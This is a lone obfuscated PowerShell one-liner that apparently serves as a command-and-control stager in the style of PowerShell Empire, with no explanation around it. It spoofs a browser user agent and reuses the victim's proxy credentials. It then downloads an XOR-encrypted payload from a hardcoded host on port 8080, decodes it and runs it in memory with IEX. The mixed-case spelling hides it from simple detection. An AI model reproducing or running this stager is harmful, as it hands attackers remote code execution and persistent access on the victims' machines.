
$WC=NeW-Object SystEM.NeT.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeaderS.Add('User-Agent',$u);$wc.ProXY = [SystEm.NEt.WEBReQuEst]::DeFaULTWeBPROxY;$wc.PRoxy.CrEdeNtiAlS = [SysTem.NEt.CREDentIaLCAcHE]::DefaULTNetWOrkCrEDentIaLS;$K='827ccb0eea8a706c4c34a16891f84e7b';$I=0;[ChAr[]]$B=([chaR[]]($wC.DoWNLoAdStRINg("http://192.168.2.106:8080/index.asp")))|%{$_-bXOR$K[$I++%$k.LeNgth]};IEX ($b-JOIN'')

